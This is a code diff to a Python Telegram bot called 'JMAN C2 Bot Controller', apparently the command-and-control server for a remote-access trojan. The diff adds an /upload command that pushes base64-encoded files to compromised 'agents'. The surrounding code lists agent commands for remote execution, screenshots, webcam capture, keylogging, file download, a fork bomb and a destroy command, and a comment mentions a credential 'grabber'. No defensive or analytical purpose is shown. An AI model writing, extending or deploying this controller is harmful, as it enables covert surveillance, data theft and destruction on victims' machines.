@@ -1,6 +1,7 @@
 #
 # JMAN C2 Bot Controller - FIXED & UPGRADED
-# - UPDATED: Removed 'cookies' command and updated /help menu for new grabber.
+# - UPDATED: Added /upload command handler for file uploads to the agent.
+# - UPDATED: Removed 'cookies' from the command list and help menu.
 #
 import os
 import re
@@ -10,14 +11,16 @@ import httpx
 import asyncio
 import traceback
 import time
+import base64
 from datetime import datetime
 from flask import Flask, request, Response
 
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
 from telegram.constants import ParseMode
 
 # --- Configuration ---
+# Load these from your environment variables on your server (e.g., Vercel)
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = os.getenv("JOBS_URL")
@@ -28,8 +31,7 @@ HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
-# (The helper functions remain the same)
-# ...
+# --- Helper Functions ---
 def esc(text):
     """Escapes characters for Telegram's MarkdownV2 parser."""
     escape_chars = r'_*[]()~`>#+-=|{}.!'
@@ -44,7 +46,7 @@ async def make_async_request(method, url, json_data=None, retries=3, delay=2):
                     res = await client.get(url, timeout=10)
                 elif method.upper() == 'POST':
                     res = await client.post(url, json=json_data, timeout=10)
-                res.raise_for_status()
+                res.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
                 return res.json()
             except httpx.RequestError as e:
                 print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}")
@@ -78,8 +80,9 @@ async def post_job(target_id, command, args):
     current_jobs.append(job)
     return await make_async_request('POST', JOBS_URL, json_data=current_jobs)
 
-# (Core command handlers like /list, /target, /destroy remain the same)
-# ...
+
+# --- Telegram Command Handlers ---
+
 async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Lists all currently active agents based on the heartbeat data."""
     await update.message.reply_text("⏳ Fetching active agents...", parse_mode=ParseMode.MARKDOWN_V2)
@@ -145,6 +148,42 @@ async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch destroy command\\.", parse_mode=ParseMode.MARKDOWN_V2)
 
+async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handles file uploads to the agent."""
+    selected_target = await get_state()
+    if not selected_target:
+        await update.message.reply_text("❌ No target selected\\. Use `/target <id>` first\\.", parse_mode=ParseMode.MARKDOWN_V2)
+        return
+    
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text("❓ **How to use:** Reply to a file with the command `/upload` to send it to the agent.", parse_mode=ParseMode.MARKDOWN_V2)
+        return
+
+    try:
+        doc = update.message.reply_to_message.document
+        file = await doc.get_file()
+        
+        # Download the file into memory
+        file_content = await file.download_as_bytearray()
+        
+        # Encode file content to Base64 to safely send in JSON
+        file_b64 = base64.b64encode(file_content).decode('utf-8')
+
+        # Prepare arguments for the job
+        args_dict = {
+            "filename": doc.file_name,
+            "file_data_b64": file_b64,
+            "destination_path": " ".join(context.args) or "" # Use arguments as destination path, or empty if none
+        }
+
+        if await post_job(selected_target, "upload", json.dumps(args_dict)):
+            await update.message.reply_text(f"✅ Upload job for `{esc(doc.file_name)}` dispatched to `{esc(selected_target)}`\\.", parse_mode=ParseMode.MARKDOWN_V2)
+        else:
+            await update.message.reply_text("❌ Error: Failed to dispatch upload job\\.", parse_mode=ParseMode.MARKDOWN_V2)
+
+    except Exception as e:
+        await update.message.reply_text(f"❌ An error occurred during upload: `{esc(str(e))}`", parse_mode=ParseMode.MARKDOWN_V2)
+
 
 async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles all other agent-specific commands."""
@@ -162,7 +201,6 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
         await update.message.reply_text("❌ Error: Failed to dispatch job\\.", parse_mode=ParseMode.MARKDOWN_V2)
 
 
-# --- UPDATED: Help Command ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Displays the help menu."""
     help_text = (
@@ -211,7 +249,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files\n"
         "`/cd <dir>` \\- Change directory\n"
-        "`/download <file>` \\- Download a file\n\n"
+        "`/download <file>` \\- Download a file from the agent\n"
+        "`/upload` \\- Reply to a file to upload it to the agent\n\n"
         
         "*💣 DESTRUCTIVE & ADVANCED \\(Admin\\)*\n"
         "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
@@ -226,11 +265,12 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
 
 
-# --- UPDATED: Agent Command List ---
+# --- Register all command handlers with the application ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
+ptb_app.add_handler(CommandHandler("upload", cmd_upload))
 
 agent_commands = [
     "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
@@ -244,17 +284,20 @@ agent_commands = [
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
-# (The main webhook endpoint and async processing remain the same)
-# ...
+
+# --- Main Webhook Endpoint ---
 @app.route('/', methods=['POST'])
 def process_webhook():
     if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
         return Response('Unauthorized', status=403)
+    
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
+    
     return Response('OK', status=200)
 
 async def process_update_async(update_data):
+    """Asynchronously process the update from Telegram."""
     try:
         async with ptb_app:
             update = Update.de_json(update_data, ptb_app.bot)
@@ -265,7 +308,9 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['GET'])
 def health_check():
+    """A simple endpoint to confirm the bot is running."""
     return "Bot is running.", 200
 
+# This part is useful for local testing but might not be used on Vercel
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
